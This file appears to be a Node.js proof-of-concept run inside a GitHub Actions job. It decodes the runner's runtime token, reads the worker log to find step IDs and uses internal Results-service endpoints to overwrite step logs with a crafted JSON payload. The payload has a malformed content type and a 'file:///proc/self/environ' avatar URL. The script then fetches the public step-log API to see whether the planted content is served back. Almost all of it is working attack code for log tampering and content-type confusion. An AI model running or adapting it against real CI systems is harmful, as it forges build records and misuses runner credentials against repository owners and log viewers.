import {createHash} from 'node:crypto';
import fs from 'node:fs';
import {execSync} from 'node:child_process';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {getResultsServiceUrl} from '../node_modules/@actions/artifact/lib/internal/shared/config.js';

const odd='\u0085application/json';
const repo=process.env.GITHUB_REPOSITORY, runId=process.env.GITHUB_RUN_ID, token=process.env.GITHUB_TOKEN;
const rt=process.env.ACTIONS_RUNTIME_TOKEN||'';
const claims=JSON.parse(Buffer.from(rt.split('.')[1],'base64url').toString());
const m=new RegExp('Actions\\.Results:([^: ]+):([^ ]+)').exec(claims.scp||'');
const runBackend=m?m[1]:null, jobBackend=m?m[2]:null;
const body=Buffer.from(JSON.stringify({full_name:'x/'+repo,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'steplog',stargazers_count:0}));

function req(url,method='GET',body=null,headers={}){
  return new Promise((resolve,reject)=>{
    const t=new URL(url);const mod=t.protocol==='https:'?https:http;
    const r=mod.request(t,{method,headers,timeout:25000},res=>{const c=[];res.on('data',x=>c.push(x));res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(c)}));});
    r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));if(body)r.write(body);r.end();
  });
}
const base=getResultsServiceUrl();
async function twirp(method,payload,path){
  const url=new URL(path||`/twirp/results.services.receiver.Receiver/${method}`, base).href;
  const r=await req(url,'POST',Buffer.from(JSON.stringify(payload)),{Authorization:`Bearer ${rt}`,'Content-Type':'application/json',Accept:'application/json'});
  let j=null;try{j=JSON.parse(r.body.toString())}catch{}
  return {status:r.status,body:j,raw:r.body.toString().slice(0,300)};
}
async function upload(url,bytes,ct){const b=new BlobClient(url).getBlockBlobClient();await b.uploadData(bytes,{blobHTTPHeaders:{blobContentType:ct}});}
function ctHex(h){return h?Buffer.from(h,'latin1').toString('hex'):null;}

const out={runBackend,jobBackend};
// find worker log
let workerLog=null;
try{
  workerLog=execSync("find /home/runner/actions-runner -name 'Worker_*.log' -mmin -30 2>/dev/null | head -1",{encoding:'utf8'}).trim();
}catch{}
out.workerLog=workerLog;
let steps=[];
if(workerLog){
  const text=fs.readFileSync(workerLog,'utf8');
  const idx=text.indexOf('Job message:');
  if(idx>=0){
    const start=text.indexOf('{',idx);
    // brace match with string awareness
    let depth=0, inStr=false, esc=false, end=-1;
    for(let i=start;i<text.length;i++){
      const c=text[i];
      if(inStr){ if(esc) esc=false; else if(c==='\\') esc=true; else if(c==='"') inStr=false; continue; }
      if(c==='"'){inStr=true;continue;}
      if(c==='{') depth++;
      else if(c==='}'){ depth--; if(depth===0){end=i+1;break;} }
    }
    if(end>start){
      try{
        const msg=JSON.parse(text.slice(start,end));
        out.jobMessageKeys=Object.keys(msg).slice(0,30);
        const plan=msg.Plan||{}; out.plan={scope:plan.ScopeIdentifier,planId:plan.PlanId,planType:plan.PlanType};
        const tl=msg.Timeline||{}; out.timeline={id:tl.Id,recordCount:(tl.Records||[]).length};
        const rawSteps=msg.Steps||[];
        out.steps=rawSteps.map(s=>({id:s.Id,type:s.Type,display:s.DisplayName,ref:s.Reference?.Name||s.Reference?.Type}));
        if(!out.steps.length && tl.Records){ out.timelineRecords=tl.Records.map(r=>({id:r.Id,type:r.Type,name:r.Name})); }
        steps=out.steps;
        out.msgJobId=msg.JobId; out.msgJobDisplayName=msg.JobDisplayName;
      }catch(e){out.parseErr=String(e.message).slice(0,200); out.snippet=text.slice(start,start+300);}
    }
  } else out.noJobMessage=true;
}
// map public job steps (name->number)
let candidates=[];
try{
  const r=await req(`https://api.github.com/repos/${repo}/actions/runs/${runId}/jobs?per_page=100`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'steplog2'});
  const j=JSON.parse(r.body.toString());
  const job=(j.jobs||[]).find(x=>x.name===process.env.GITHUB_JOB)||(j.jobs||[])[0];
  out.publicJob={id:job?.id,name:job?.name,steps:(job?.steps||[]).map(s=>({number:s.number,name:s.name}))};
  candidates=(job?.steps||[]).map(s=>({number:s.number,name:s.name}));
}catch(e){out.jobsErr=String(e.message).slice(0,200);}

// choose a step with an id; try matching public step name to message display name
const byName=(name)=>steps.find(s=>s.display===name) || steps.find(s=>name && s.display && (s.display.includes(name)||name.includes(s.display)));
const chosen=[];
for(const c of candidates){
  const hit=byName(c.name);
  if(hit) chosen.push({number:c.number,name:c.name,id:hit.id});
}
out.chosen=chosen.slice(0,8);
// plant step log for each chosen and test the public endpoint
out.tests=[];
for(const c of chosen.slice(0,4)){
  const rec={number:c.number,name:c.name,id:c.id};
  try{
    const g=await twirp('GetStepLogsSignedBlobURL',{workflow_run_backend_id:runBackend,workflow_job_run_backend_id:jobBackend,step_backend_id:c.id});
    rec.getStatus=g.status; rec.getOk=!!(g.body&&(g.body.logs_url||g.body.ok));
    const url=g.body&&g.body.logs_url;
    if(url){
      try{await upload(url,body,odd);rec.upload='ok';}catch(e){rec.upload='ERR '+String(e.message).slice(0,120);}
      const meta=await twirp('CreateStepLogsMetadata',{workflow_run_backend_id:runBackend,workflow_job_run_backend_id:jobBackend,step_backend_id:c.id,uploaded_at:new Date().toISOString(),line_count:1});
      rec.meta=meta.status; rec.metaOk=!!(meta.body&&meta.body.ok);
    }
    // public step logs endpoint
    const r1=await req(`https://api.github.com/repos/${repo}/actions/jobs/${out.publicJob.id}/steps/${c.number}/logs`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'steplog2'});
    rec.publicStatus=r1.status; rec.locHost=r1.headers.location?new URL(r1.headers.location).host:null;
    if(r1.headers.location){
      const loc=r1.headers.location; rec.locPath=new URL(loc).pathname; rec.locQuery=new URL(loc).search.slice(0,200);
      const r2=await req(loc);
      rec.hop2Status=r2.status; rec.hop2LocHost=r2.headers.location?new URL(r2.headers.location).host:null;
      if(r2.headers.location){
        const loc2=r2.headers.location; rec.loc2Path=new URL(loc2).pathname; rec.loc2Rsct=new URL(loc2).searchParams.get('rsct');
        const r3=await req(loc2);
        rec.finalStatus=r3.status; rec.finalCtHex=ctHex(r3.headers['content-type']); rec.bodyMatch=r3.body.equals(body);
      } else {
        rec.finalStatus=r2.status; rec.finalCtHex=ctHex(r2.headers['content-type']); rec.bodyMatch=r2.body.equals(body);
      }
    } else {
      rec.publicBody=r1.body.toString().slice(0,150);
    }
  }catch(e){rec.err=String(e.message).slice(0,200);}
  out.tests.push(rec);
}
console.log('STEPLOG2',JSON.stringify(out));
